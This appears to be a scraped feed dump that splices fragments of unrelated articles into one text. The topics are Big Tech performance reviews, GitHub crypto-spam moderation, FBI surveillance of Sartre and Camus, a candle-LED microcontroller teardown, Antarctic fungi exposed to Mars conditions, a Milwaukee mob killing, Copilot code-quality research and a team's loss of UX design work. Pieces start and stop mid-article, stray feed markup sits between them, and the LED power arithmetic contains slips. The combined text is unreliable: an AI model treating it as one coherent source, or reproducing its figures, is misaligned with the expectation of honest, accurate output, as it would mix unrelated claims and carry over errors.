<div id="readability-page-1" class="page"><div><article><div dir="auto"><p>I spent a fair portion of my adult life working for large tech companies. In all my interactions with peers, no other topic caused as much cynicism and angst as the question of performance management — that is, the labyrinthine processes the companies follow for deciding who to fire and who to reward for exemplary work.</p><p>Much of this anxiety arose from the belief that Big Tech wanted to instill a cutthroat environment where you’re always compelled to do your best. I don’t think that’s true: in rapidly growing companies with easy access to funding, there is no intrinsic incentive to fire mediocre staff. The process is stressful to managers, legally risky, and harmful to morale. This tendency to accumulate slack is precisely why profitable tech companies panic and go through overdue layoffs whenever the economic outlook turns for the worse.</p><p>The actual reason for performance management is that your employees are sticklers for fairness. The exact dollar figure on your paycheck matters a lot less than knowing there’s another person who does less and somehow earns more. As a manager, in every other 1:1, you hear your subordinates comparing themselves to others and demanding explanations for any perceived slights. Harboring low performers has corrosive effects on team dynamics — doubly so in places that attract talent through the mythos of only hiring the best.</p><p>For a long time, the prevailing corporate approach to performance management was to let the manager decide. After all, they had the expertise and the familiarity with the problem space, so it was believed that they’re best equipped to dole out punishment and deliver rewards. But this led to problems: some teams developed a reputation for leniency, and others for being too harsh. More insidiously, the setup allowed rumors to spread: a manager could be accused of giving preferential treatment to their buddies or love interests, with no way to disprove such claims; every company sooner or later developed extensive lore of this sort.</p><p>All this changed with Google. In its early years, the company sought to do things differently, and reinventing performance management was fair game. Google ultimately converged on a peer-based system where your performance is evaluated not by your boss, but by a selection of your coworkers. This promised greater fairness and improved transparency. Over the years, the model spread like a wildfire to other tech companies — and sometimes beyond.</p><p>Of course, the model imposed considerable burden across the company: once or twice a year, the entire business would grind to a halt as every employee was writing self-assessments and peer feedback, and then a significant proportion of senior staff was serving on committees. But the benefits seemed obvious — and well worth the price.</p><p>Except, the benefits never really materialized. The problem is that every employee is judged by their ability to get work done; in most roles, this depends on being able to get along with others, including strangers with different sensibilities and unfamiliar backgrounds. Providing honest, critical feedback is a significant and ultimately unnecessary social risk. It doesn’t help that the burden of the process prompts most to put the bare minimum of effort into individual reviews; a handful of platitudes is usually enough to get you through it and get back to work.</p><p>In the end, the feedback for most employees ends up being overwhelmingly positive — and uniformly bland. The usual exceptions are the absolute worst performers who wouldn’t survive under any other performance management regime; as well as a handful of unlucky folks who deliver solid results but lack social grace and self-promotion skills.</p><p>This outcome puts the organization in an unenviable position. To fix this, the managers are tasked with “interpreting” the feedback to arrive at some sort of a normalized ranking that can be used as a basis for firings, promotions, and bonuses. This happens behind the scenes in stuffy multi-hour meetings where the data is shuffled and massaged until it fits on some reasonable curve. The illusion of a peer-driven system is maintained — but in reality, for layoffs and compensation, the manager almost always makes the call, and peer feedback seldom reveals anything new.</p><p>To be fair, the promotion process can be different: in many places, it’s delegated to an independent committee of senior employees. The panel is unlikely to promote if the manager doesn’t support the bid, but on the flip side, having your manager’s blessing doesn’t guarantee success. The goal is to maintain a consistently high bar, but this comes at a hefty price. The committee is tasked with deciphering voluminous but sloppy feedback without the benefit of knowing the employee or understanding their work. In the end, they regularly deliver random, unsatisfying verdicts. “You’re doing great, we just need to structure your packet differently for the next cycle” is a common utterance when delivering the bad news.</p><p>The kicker is that the internal perception of this Google-originating process isn’t necessarily any better than that of what it sought to replace. At a great organizational cost, it merely traded the accusations of manager-level favoritism for grander conspiracy theories — sinister corporate agendas divined from the words of secretive, amorphous committees.</p><p>The promise of a more egalitarian performance management process is a part of the mythos of Big Tech; but it’s also a fascinating study of painting oneself into a corner, unable to walk back.</p></div></article></div></div>]]></description>

Any site that accepts user-generated content will need to figure out how to prevent people from submitting spam, whether that is for scams, malicious software, or X-rated material. I have been getting tagged in Crypto related for the past 6 months or so. In the past 24 hours I have been tagged in two of them.</p><p>Normally, these crypto scams on GitHub post and tag multiple people in it, and then almost immediately get deleted by the poster of the scam. It appears that this is a way to bypass spam filters, or at the very least make it harder to report them. According to <a href="https://github.com/orgs/community/discussions/83803#discussioncomment-8033141">this post on GitHub’s community org</a>, the end user gets an email with the full post and spam, but there is no easy way to report it since it is already deleted.</p></div><h2>The Issue</h2><p>Today, though, was my “lucky” day.

Do you know the process of reporting this? <strong>Copy Link</strong> -&gt; <strong>Go to user’s profile page</strong> -&gt; <strong>Click Block &amp; Report</strong> -&gt; <strong>Click Report Abuse button</strong> -&gt; <strong>*New page* Click “I want to report harmful… cryptocurrency abuse”</strong> -&gt; <strong>Click “I want to report suspicious cryptocurrency or mining content.” button</strong> -&gt; <strong>FINALLY</strong> paste the link you copied 10 years ago into the form box and give your justification on why this user did a bad thing and hope that the link still works/content is still up by the time they get around to looking at it…</p><p>That is 7 different steps on 3 different pages with multiple models/dropdowns… Come on, that is WAY to much. I have never reported these before because it was too much work, I legit gave up and just ignored it because I knew it was a scam and wasn’t going to fall for it. <em>IF YOU WANT YOUR USERS TO HELP YOU, MAKE IT EASY FOR THEM!</em></p><p>*Sorry, had to get that off my chest. It always seems that Trust and Safety UI/UX things like that are give little time and thought because they are not the cool sexy and flashy features that users see or care about most of the time…. until the spam starts!</p></div><h2>The Fix</h2><p>So what can be done about this? What can GitHub do? I have a couple of “simple” ideas. I say simple because I realize that not only is user-generated content moderation an uphill battle, but doing it at scale adds another level of complexity to it all.<br></p><div><p>If a user is posting multiple comments in a relatively short period of time (lets say a day), have some system that checks to see if it’s a 95% copy and paste to all of their other issues? Ok, this could snag some real users who, say, use templates in their PRs or issues. Fine, there must be some way to rate that account on a number of other factors and their past activity. If they have no repos, no commits in any repos (public or private), no profile picture, no bio, no SSH keys, etc etc, and all they are doing is making comments…. That is a lot of red flags to me personally. </p><p>Another “simple” idea, is to compare comments site wide with each other. They are using the same heading, same body, same image, same links, and just checking who they are tagging. That is a pretty big red flag for me as well. Also, tagging 20 people (even 10 people) at a time can be a red flag. Maybe not once or twice, but if they do it multiple times and always to different users, then that should trigger something to prevent them from posting.</p></div><h2>Conclusion</h2><p>With the rise of generative AI and ChatGPT being able to write endless variations of 1 spam template to bypass the similarity check I just proposed above, content moderation will continue to be an uphill battle. It most likely will get even harder! I am a bit surprised though about GitHub’s, seemingly, lack of ability to handle this sort of spam. I am 100% sure (no proof, though) that intelligent people are already working on this at GitHub, but it’s a clear that they need a concrete plan moving forward. They need to put some real effort into it. Hell, train some AI to auto-filter or auto-rank comments before they get posted. If there are too many red flags, then hold those comments for human moderation before letting it be posted. Spam is nothing new, and I am sure that spam on GitHub is nothing new, but it seems to be getting worse and the only thing getting better are the spammers.</p></div></article></div></div>]]></description>

<p>Today, as you must sure­ly know, marks the 50th&nbsp;anniver­sary of John F. Kennedy’s assas­si­na­tion and also sure­ly marks a revival of inter­est in the myr­i­ad con­spir­a­cy the­o­ries that abound in the absence of a sat­is­fac­to­ry expla­na­tion for the events at Dealey Plaza on Novem­ber 22nd, 1963. One the­o­ry I’ve nev­er heard float­ed before comes to us via <a href="http://www.mml.cam.ac.uk/french/staff/am260/">Andy Mar­tin</a>, lec­tur­er in French at Cam­bridge Uni­ver­si­ty and author of <a href="http://amzn.to/1bHskdg"><i>The Box­er and the Goal­keep­er: Sartre vs Camus</i></a>. In an <a href="http://www.prospectmagazine.co.uk/art-books/camus-sartre-fbi-hoover/#.Uo7ii6UkTwK">arti­cle for <i>Prospect</i> mag­a­zine</a>, Mar­tin writes:</p>
<p>To the massed ranks of the CIA, the Mafia, the KGB, Cas­tro, Hoover, and LBJ, we can now add: Jean-Paul Sartre. FBI and State Depart­ment reports of the 1960s had drawn atten­tion to Sartre’s mem­ber­ship of the Fair Play for Cuba Com­mit­tee, of which Lee Har­vey Oswald was also a mem­ber. And—prophetically?—Sartre had “dis­missed the US as a head­less nation.” […] Could he, after all, have been the Sec­ond Shoot­er?</p>
<p>It’s prob­a­bly fair to say that Martin’s tongue is wedged firm­ly in his cheek through­out this open­ing of his fas­ci­nat­ing chron­i­cle of the FBI’s sur­veil­lance of <a href="http://plato.stanford.edu/entries/sartre/">Sartre</a> and his one­time friend and edi­tor <a href="http://plato.stanford.edu/entries/camus/">Albert Camus</a>. But Martin’s inter­est in the mis­al­liance of Sartre and the Feds is very seri­ous. What he finds dur­ing his inves­ti­ga­tion of the FBI files on exis­ten­tial­ism is that “the <a href="https://en.wikipedia.org/wiki/G-Man_(slang)">G‑men</a>, ini­tial­ly so anti-philo­soph­i­cal, find them­selves reluc­tant­ly phi­los­o­phiz­ing. They become (in GK Chesterton’s phrase) <i>philo­soph­i­cal police­men</i>.”</p>


<p>While we have become accus­tomed, since the days of Joe McCarthy, to ide­o­log­i­cal witch hunts, it seems that Sartre and Camus served as test cas­es for the sort of thing that fre­quent­ly plays out in over­heat­ed Con­gres­sion­al hear­ings and media denunciations—agents with fur­rowed brows and lit­tle philo­soph­i­cal train­ing des­per­ate­ly try­ing to work out whether such and such abstruse aca­d­e­m­ic is part of a grand con­spir­a­cy to under­mine truth, jus­tice, the Amer­i­can Way, etc.. Sartre appeared ear­ly on the anti-Com­mu­nist radar, though, iron­i­cal­ly, he did so as a plant of sorts, <a href="http://www.nytimes.com/2013/09/09/us/when-sartre-and-camus-met-hoovers-g-men.html?pagewanted=all&amp;_r=1&amp;">brought over in 1945</a> by the Office of War Infor­ma­tion as part of a group of jour­nal­ists the Unit­ed States’ gov­ern­ment hoped would put out good pro­pa­gan­da.</p>
<p>“Hoover won­dered,” how­ev­er, writes Mar­tin, “what kind of good pro­pa­gan­da you can hope to get out of the author of <i>Nau­sea</i> and <i>Being and Noth­ing­ness</i>.” It turned out, not much, but a year lat­er Hoover latched on to Sartre’s friend and edi­tor Albert Camus, whose name he and his agents spelled, var­i­ous­ly, as “Canus” or “Corus.” Where Sartre had breezed into the country—smitten by its lit­er­a­ture and music—Camus was held at immi­gra­tion on Hoover’s orders. He would spend a brief, depress­ing time and nev­er return.</p>
<p>How we get from post-war sur­veil­lance of French exis­ten­tial­ist philoso­phers to Sartre and the grassy knoll is a long and com­pli­cat­ed tale, befit­ting the para­noid imag­in­ings of J. Edgar Hoover. He was, after all, the con­spir­a­cy the­o­rist <i>par excel­lence</i> and “he need­ed to know,” writes Mar­tin, “if Exis­ten­tial­ism and Absur­dism were some kind of front for Com­mu­nism. To him, every­thing was poten­tial­ly a cod­ed re-write of the Com­mu­nist Man­i­festo.” What Hoover feared from Sartre, how­ev­er, was that the lat­ter was him­self an influ­en­tial believ­er in a con­spir­a­cy, one that cast doubt on the FBI’s strong­ly-held belief that Oswald was the lone gun­man.</p>
<p>Despite gath­er­ing years of NSA-wor­thy sur­veil­lance on the philoso­phers, Hoover’s agents were nev­er able to dis­cern the ide­o­log­i­cal pro­gram of the French. “I can’t work out,” wrote one in a note in Sartre’s file, “if he’s pro-Com­mu­nist or anti-Com­mu­nist.” The black-and-white, spy-vs-spy world of the FBI left lit­tle room for philo­soph­i­cal nuance and lit­er­ary ambi­gu­i­ty, after all. But they nev­er stopped watch­ing Sartre, con­vinced that “there must be some kind of con­spir­a­cy between com­mu­nists, blacks, poets and French philoso­phers.” As it turns out, there were several—political and aes­thet­ic con­spir­a­cies involv­ing such ter­ri­fy­ing fig­ures as Frantz Fanon and Aimé Césaire. These poets and close rela­tions of Sartre did, indeed, help foment rev­o­lu­tion in the Caribbean and elsewhere—but theirs are sto­ries for anoth­er day.</p>

<p>Years ago I spent some time <a href="https://cpldcpu.wordpress.com/2013/12/08/hacking-a-candleflicker-led/">analyzing Candle-Flicker LEDs</a> that contain an integrated circuit to mimic the flickering nature of real candles. Artificial candles have evolved quite a bit since then, now including magnetically actuated “flames”, an even better candle-emulation. However, at the low end, there are still simple candles with candle-flicker LEDs to emulate tea-lights.</p>



<p>I was recently <a href="https://www.mikrocontroller.net/topic/482929">tipped off</a> to an upgraded variant that includes a timer that turns off the candle after it was active for 6h and turns it on again 18h later. E.g. when you turn it on at 7 pm on one day, it would stay active till 1 am and deactive itself until 7 pm on the next day. Seems quite useful, actually. The question is, how is it implemented? I bought a couple of these tea lights and took a closer look.</p>

<p>On the inside there is not much – a single 5mm LED and a black plastic part for the switch. Amazingly, the switch does now only move one of the LED legs so that it touches the battery. No additional metal parts required beyond the LED. As prevously, there is an IC  integrated together with a small LED die in the LED package.</p>

<p>Looking top down through the lens with a microscope we can see the dies from the top. What is curious about the IC is that it rather large, has plenty of unused pads (3 out of 8 used) and seems to have relatively small structures. There are rectangular regular areas that look like memory, there is a large area in the center with small random looking structure, looking like synthesized logic and some part that look like hand-crafted analog. Could this be a microcontroller?</p>



<p>Interestingly, also the positions of the used pads look quite familiar.</p>

<p>The pad-positions correspond exactly to that of the PIC12F508/9, VDD/VSS are bonded for the power supply and GP0 connects to the LED. This pinout has been adopted by the ubiqitous <a href="https://cpldcpu.wordpress.com/2019/08/12/the-terrible-3-cent-mcu/">low-cost 8bit OTP controller</a>s that can be found in every cheap piece of chinese electronics nowadays.</p>



<p>Quite curious, so it appears that instead of designing another ASIC with candle flicker functionality and accurate 24h timer they simply used an OTP microcontroller and molded that into the LED. I am fairly certain that this is not an original microchip controller, but it likely is one of many PIC derivatives that  cost around a cent per die.</p>

<p>For some quick electrical characterization is connected the LED in series with a 220 Ohm resistor to measure the current transients. This allows for some insight into the internal operation. We can see that the LED is driven in PWM mode with a frequency of around 125Hz.  (left picture)</p>



<p>When synchronizing to the rising edge of the PWM signal we can see the current transients caused by the logic on the IC. Whenever a logic gate switches it will cause a small increase in current. We can see that similar patterns repeat at an interval of 1 µs. This suggests that the main clock of the MCU is 1 MHz. Each cycle looks slightly different, which is indicative of a program with varying instruction being executed.</p>



<h2>Sleep mode</h2>

<p>To gain more insights, I measured that LED after it was on for more than 6h and had entered sleep mode. Naturally, the PWM signal from the LED disappeared, but the current transients from the MCU remained the same, suggesting that it still operates at 1 MHz.</p>



<p>Integrating over the waveform allows to calculate the average current consumption. The average voltage was 53mV and thus the average current is 53mV/220Ohn=240µA.</p>



<h2>Can we improve on this?</h2>



<p>This is a rather high current consumption. Employing a MCU with sleep mode would allow to bring this down significiantly. For example the <a href="https://cpldcpu.wordpress.com/2021/02/07/ultra-low-power-led-flasher/">PFS154 allows</a> for around 1µA idle current, the <a href="https://www.microchip.com/en-us/product/attiny402">ATtiny402 even</a> a bit less.</p>



<p>Given a current consumption of 240µA, a CR2023 with a capacity of 220mAh would last around 220/0.240 = 915h or 38 days. </p>



<p>However, during the 6h it is active a current of several mA will be drawn from the battery. Assuming an average current of 2 mA, the battery woudl theoretically last 220mAh/3mA=73h. In reality, this high current draw <a href="https://www.dmcinfo.com/Portals/0/Blog%20Files/High%20pulse%20drain%20impact%20on%20CR2032%20coin%20cell%20battery%20capacity.pdf">will reduce its capacity significantly</a>. Assuming 150mAh usable capacity of a low cost battery, we end up  with around 50h of active operating time.</p>



<p>Now lets assume we can reduce the idle current consumption from 240µA to 2µA (18h of off time per day), while the active current consumption stays the same (mA for 6h):</p>



<p>a) Daily battery draw of current MCU: 6h*2mA + 18h*240µA = 16.3mAh<br>b) Optimzed MCU: 6h*2mA + 18h*2µA = 12mAh</p>



<p>Implementing a proper power down mode would therefore allows extending the operating life from 9.2 days to 12.5 days – quite a significant improvement. The main lever is the active consumption, though. </p>



<h2>Summary</h2>



<p>In the year 2023, it appears that investing development costs in a candle-flicker ASIC is no longer the most economical option. Instead, ultra-inexpensive 8-bit OTP microcontrollers seem to be taking over low-cost electronics everywhere.</p>



<p>Is it possible to improve on this candle-LED implementation? It seems so, but this may be for another project.</p>

        <p>The McMurdo Dry Valleys, located in the Antarctic Victoria Land, are considered to be the most similar earthly equivalent to Mars. They make up one of the driest and most hostile environments on our planet, where strong winds scour away even snow and ice. Only so-called cryptoendolithic microorganisms, capable of surviving in cracks in rocks, and certain lichens can withstand such harsh climatological conditions.</p><p>A few years ago a team of European researchers travelled to these remote valleys to collect samples of two species of cryptoendolithic fungi: <em>Cryomyces antarcticus</em> and <em>Cryomyces minteri</em>. The aim was to send them to the International Space Station (ISS) for them to be subjected to Martian conditions and space to observe their responses.</p><p>The tiny fungi were placed in cells (1.4 centimetres in diameter) on a platform for experiments known as EXPOSE-E, developed by the European Space Agency to withstand extreme environments. The platform was sent in the Space Shuttle Atlantis to the ISS and placed outside the Columbus module with the help of an astronaut from the team led by Belgian Frank de Winne.</p><p>For 18 months half of the Antarctic fungi were exposed to Mars-like conditions. More specifically, this is an atmosphere with 95% CO<sub>2,</sub> 1.6% argon, 0.15% oxygen, 2.7% nitrogen and 370 parts per million of H<sub>2</sub>O; and a pressure of 1,000 pascals. Through optical filters, samples were subjected to ultra-violet radiation as if on Mars (higher than 200 nanometres) and others to lower radiation, including separate control samples.</p><p>“The most relevant outcome was that more than 60% of the cells of the endolithic communities studied remained intact after ‘exposure to Mars’, or rather, the stability of their cellular DNA was still high,” highlights Rosa de la Torre Noetzel from Spain’s National Institute of Aerospace Technology (INTA), co-researcher on the project.</p><div>

            </div>
            </div><p>The scientist explains that this work, published in the journal ‘<em>Astrobiology’</em>, forms part of an experiment known as the Lichens and Fungi Experiment (LIFE), “with which we have studied the fate or destiny of various communities of lithic organisms during a long-term voyage into space on the EXPOSE-E platform.”</p><p>“The results help to assess the survival ability and long-term stability of microorganisms and bioindicators on the surface of Mars, information which becomes fundamental and relevant for future experiments centred around the search for life on the red planet,” states De la Torre.</p><p><strong>Also lichens from Gredos and the Alps</strong></p><p>Researchers from the LIFE experiment, coordinated from Italy by Professor Silvano Onofri from the University of Tuscany, have also studied two species of lichens (<em>Rhizocarpon geographicum</em> and <em>Xanthoria elegans</em>) which can withstand extreme high-mountain environments. These have been gathered from the Sierra de Gredos (Avila, Spain) and the Alps (Austria), with half of the specimens also being exposed to Martian conditions.</p><p>Another range of samples (both lichens and fungi) was subjected to an extreme space environment (with temperature fluctuations of between -21.5 and +59.6 ºC, galactic-cosmic radiation of up to 190 megagrays, and a vacuum of between 10<sup>-7</sup> to 10<sup>-4</sup> pascals). The effect of the impact of ultra-violet extraterrestrial radiation on half of the samples was also examined.</p><p>After the year-and-a-half-long voyage, and the beginning of the experiment on Earth, the two species of lichens ‘exposed to Mars’ showed double the metabolic activity of those that had been subjected to space conditions, even reaching 80% more in the case of the species <em>Xanthoria elegans</em>.</p><p>The results showed subdued photosynthetic activity or viability in the lichens exposed to the harsh conditions of space (2.5% of samples), similar to that presented by the fungal cells (4.11%). In this space environment, 35% of fungal cells were also seen to have kept their membranes intact, a further sign of the resistance of Antarctic fungi.</p><div>

They were more than family stories to me. They were lessons in how to live.</p><p>But my father didn’t ever want to talk about Augie. He was the youngest of 13 in a Sicilian immigrant family, and I think he wanted to keep his own children out of trouble and far away from even the mention of organized crime.&nbsp;</p><p>After my dad died 11 years ago, I thought my Aunt Marjorie — the last survivor of the 13 Spicuzza siblings — might tell me why Augie was killed.</p><partner-banner util-module-path="elements/partner" fluid="" bottom="" lazy="" min-height="390" outstream=""></partner-banner><p>“Why do you want to talk about <em>that</em>?” she snapped, ending the discussion before it started.</p><p>Now an investigative reporter at the Milwaukee Journal Sentinel, I mustered the courage to try to find out what happened to Augie, and why.&nbsp;</p><p>I turned to police files, FBI reports and newspaper articles — and tracked down former detectives, FBI agents, prosecutors and others who knew Augie, many of whom agreed to speak with me about the case for the first time.</p><p>What I found was a story about loyalty, jealousy, and power — and what some people are willing to do for it.</p><h2>'The King of Commission Row'</h2><media-image image-set="https://www.gannett-cdn.com/authoring/authoring-images/2024/01/11/PLOU/72188337007-augie-family.jpg bestCrop, https://www.gannett-cdn.com/authoring/authoring-images/2024/01/11/PLOU/72188337007-augie-family.jpg?crop=1618,1213,x216,y0 4:3, https://www.gannett-cdn.com/authoring/authoring-images/2024/01/11/PLOU/72188337007-augie-family.jpg?crop=910,1213,x540,y0 3:4, https://www.gannett-cdn.com/authoring/authoring-images/2024/01/11/PLOU/72188337007-augie-family.jpg?crop=2158,1213,x0,y0 16:9" image-alt="" credit="Illustration: Andrea Brunty, USA TODAY Network; Photos: Provided; Milwaukee Historical Society; Milwaukee Journal Sentinel files" caption="Augie in historical photos.

It came to be known as the “Bloody Third” due to its rough reputation, thanks in part to the high number of saloons and brawls.&nbsp;</p><p>After a massive fire in 1892 destroyed more than 400 buildings and left some 2,000 people homeless, Italian immigrants moved into the neighborhood.&nbsp;</p><p>Most, including my father’s family, came from Sicily. And many of them made a living in the produce business, selling fruits and vegetables – first from push carts, then horse-drawn wagons and eventually trucks. The Palmisano and Spicuzza families were among them.</p><p>Augie grew up helping at his father’s produce business in the heart of what was then known as Commission Row — a gritty stretch of Broadway that was packed with fruit and vegetable merchants.

I’ve been told so many Sicilian Americans attended Lincoln High that at one point plays were called from the sideline in Italian. It was the same school that Frank Balistrieri graduated from a decade earlier.&nbsp;</p><p>In 1952, Augie married Jean Rose Lassa. They had four children together and bought a home for the family in Whitefish Bay. He worked second shift at American Motors while helping run the family produce company. After his father died in 1964, Augie took over the company, which by then was named Palmisano Produce.&nbsp;</p><p>In the years that followed, Augie started running the tavern adjacent to Palmisano Produce.

Because I'm sure if we thought that was enough, we would have pursued it. But, proving beyond a reasonable doubt that he ordered it just because he was gloating about someone's death,” Franke said. “I don't know. Maybe we missed something.

        <p>
  New research on the effect of AI-powered GitHub Copilot on software development cites some adverse results.
  
</p>



<p>
  The "<a href="https://www.gitclear.com/coding_on_copilot_data_shows_ais_downward_pressure_on_code_quality" target="_blank">Coding on Copilot</a>" whitepaper from GitClear sought to investigate the quality and maintainability of AI-assisted code compared to what would have been written by a human. In other words: "Is it more similar to the careful, refined contributions of a Senior Developer, or more akin to the disjointed work of a short-term contractor?" 
  
</p>



<p>
  The answer to that is summarized in this paragraph from the whitepaper's abstract:
  
</p>



<blockquote>
  <i>
    "We find disconcerting trends for maintainability. Code churn -- the percentage of lines that are reverted or updated less than two weeks after being authored -- is projected to double in 2024 compared to its 2021, pre-AI baseline. We further find that the percentage of 'added code' and 'copy/pasted code' is increasing in proportion to 'updated,' 'deleted,' and 'moved 'code. In this regard, AI-generated code resembles an itinerant contributor, prone to violate the DRY-ness [don't repeat yourself] of the repos visited."
    
  </i>
</blockquote>




<p>
  That serves as a counterpoint to findings of some other studies, including <a href="https://visualstudiomagazine.com/articles/2022/09/13/copilot-impact.aspx" target="_blank">one from GitHub in 2022</a> that found, for one thing: "developers who used GitHub Copilot completed the task significantly faster -- 55 percent faster than the developers who didn't use GitHub Copilot." That study was noted in the new whitepaper from GitClear, which sells a cloud-based code review tool. In addition to productivity, the GitHub study also measured positive effects in developer satisfaction and conserving mental energy.
  
</p>



<p>
  GitClear's research, however, investigated "how the composition of code changes when AI is used." GitClear said its report sheds light on:
  
</p>



<ul>
<li>What are the three significant changes since Copilot's introduction?
</li>
<li>What do Technical Leaders need to be on the lookout for 2024?
</li>
<li>How can you measure the impact of AI on your team's code quality?</li>
</ul>

    





<p>
  Regarding that first item, the paper indicated the three most significant changes associated with Copilot's rise concerned "Churn"  and "Moved" and "Copy/Pasted" code:
  
</p>



<ul>
<li><b>Burgeoning Churn: </b> "The bottom line is that 'using Copilot' is strongly correlated with 'mistake code' being pushed to the repo."

<figcaption> <b>[Click on image for larger view.]</b> Code Churn by Year <em>(source: GitClear).</em></figcaption>
</figure></div>

</li>
<li><b>Less Moved Code Implies Less Refactoring, Less Reuse:</b> "Combined with the growth in code labeled 'Copy/Pasted,' there is little room to doubt that the current implementation of AI Assistants discourages code reuse. Instead of refactoring and working to DRY ('Don't Repeat Yourself') code, these Assistants offer a one-keystroke temptation to repeat existing code."
</li>
<li><b>More Copy/Pasted Code Implies Future Headaches:</b> "There is perhaps no greater scourge to long-term code maintainability than copy/pasted code. In effect, when a non-keyword line of code is repeated, the code author is admitting 'I didn't have the time to evaluate the previous implementation.' By re-adding code instead of reusing it, the chore is left to future maintainers to figure out how to consolidate parallel code paths that implement repeatedly-needed functionality."</li>
</ul>




<p>
  The paper concludes: "How will Copilot transform what it means to be a developer? There's no question that, as AI has surged in popularity, we have entered an era where code lines are being added faster than ever before. The better question for 2024: who's on the hook to clean up the mess afterward?"

We had been working on a new product for a couple of years, a very large beast of a program that was used to analyze simulations of computer chips and provide useful information to the people verifying their correctness.  In short, fertile ground for possible patentable ideas.</p><p>The company encouraged engineers to seek patents on work we did, and would send out someone from our legal department on a regular basis to solicit ideas for patents.  This time though, we were coming up blank — even though the product we all worked on was super innovative and complex. The development team had been brought together to brainstorm with the patent person on possibilities, but everyone was kind of in a bad mood about it. She encouraged us to just start throwing out ideas, even if we thought they were not patentable ones.  Silence. People just sat quietly, arms crossed.</p><p><span>The patent attorney shifted uncomfortably in her chair.  </span><em>Isn’t there some unique analysis feature we had worked on that we could look into patenting?</em><span> she prompted.</span></p><p>No, we would sadly reply, the analysis logic for our product was handled by a different group.  We were working lately just on a graphical user interface component for it.</p><p><em>That’s OK</em><span>, she reassured.  </span><em>User interface designs can also be patented, especially if they solve a problem in a unique way</em><span>.  </span></p><p>And it was certainly true that the component we were building fit that description and did in fact have a lot of unique, probably patentable, ideas behind it.  The problem was, even though we were building the component, we did not design it. Our software development group had turned into an implementation factory, churning out features invented by outsiders, but without much input from us on the actual design.</p><p>We referred the patent attorney to the other group that had designed the product interface, and she left our meeting without any ideas from our team to work on. It was not unusual for a brainstorming meeting like this to ultimately lead to nothing patented, but what was unusual was to hold a meeting where no one could think of a single good idea to even write down.  It was awkward and everyone felt bad after the meeting.  And I came away from that determined to try to do something about it.</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg" width="580" height="386.9337016574586" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:483,&quot;width&quot;:724,&quot;resizeWidth&quot;:580,&quot;bytes&quot;:129389,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/jpeg&quot;,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F92e5c557-f0a2-43d1-8521-6848f20aa49c_724x483.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption>Credit: Teera Konakan via Getty Images</figcaption></figure></div><p>Trouble had been brewing for a while on this team.  A management organizational shift had been made months back, in response to a perceived problem with our product’s current user interface design.  Customers had complained about the usability, and to be honest, there were indeed issues there.  For most of the development life of this product, software engineers without any UX design experience were building all the user interfaces. </p><p>With predictable results. Clunky user flows, obscure, hard-to-use controls, inconsistent use methodology, and so on.  We were lucky in one sense that our customers were primarily also engineers, so there may have been some nerdy synergy regarding the very function-over-form design.  But the complaints about the quality of the UI eventually reached upper management, who decided to do something about it.</p><p>They budgeted for hiring some UX design experts to take over the interface design of the product, which seemed like a good move to me when we first heard it.   I initially welcomed having 